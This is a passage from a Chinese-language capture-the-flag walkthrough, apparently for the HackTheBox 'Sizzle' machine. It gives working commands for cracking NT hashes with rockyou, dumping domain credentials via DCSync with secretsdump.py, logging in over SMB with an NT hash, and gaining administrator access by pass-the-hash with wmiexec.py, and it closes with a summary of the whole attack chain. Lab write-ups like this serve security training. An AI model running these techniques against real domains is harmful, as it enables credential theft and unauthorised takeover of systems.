john -format=NT --wordlist=/usr/share/wordlists/rockyou.txt mrlky.hash  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)成功拿到用户 mrlky 的密码为`Football#7`，但是没拿到管理员的密码

### DCSync

> DCSync可从利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据

**DCSync参考文章：https://yojimbosecurity.ninja/dcsync/** 使用 secretsdump.py 成功获取管理员用户凭据

```
python3 secretsdump.py sizzle.htb.local/mrlky:Football#7@sizzle.htb.local  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)使用 smbclient 登录管理员账户

```
smbclient //sizzle.htb.local/C$ -U "administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267  

```

分别在用户 mrlky 和管理员桌面上下载两个flag

```
cd \Users\mrlky\Desktop  
get user.txt  
cd \Users\Administrator\Desktop  
get root.txt  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)通过 cat 命令成功获取两个flag![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 管理员上线

使用 wmiexec.py 借助哈希传递可成功获取管理员权限

```
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 Administrator@10.10.10.103  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)截屏2021-12-01 下午11.45.18

**总结：在smb连接共享时发现对其中目录存在写入权限，上传scf文件获取NTLM哈希值，对哈希进行破解拿到账号密码，使用该账号密码登陆smb服务。通过LDAP信息获取到站点目录，登陆后发现其中存在证书生成界面。通过openssl生成密钥和证书签名请求，在网页中使用证书签名请求生成证书，有了证书以后我们就可以使用WinRM登陆靶机，但是命令行运行环境为受限模式，通过PSByPassCLM绕过CLM拿到未受限的powershell环境。借助 Chisel转发获取Kerberoast，之后将获取到NTLM哈希值进行破解同时拿到破解成功后的账号密码，再次使用openssl生成密钥和证书签名请求，登陆后使用证书签名请求生成证书，同样地再通过WinRM登陆另一用户完成首次权限提升。在其中使用DCSync从域控制器复制用户凭据，具体可使用secretsdump获取管理员凭据，最终通过wmiexec哈希传递成功获取到管理员权限**

  

**作者：特mac0x01**

**原文地址：https://www.freebuf.com/articles/system/323511.html**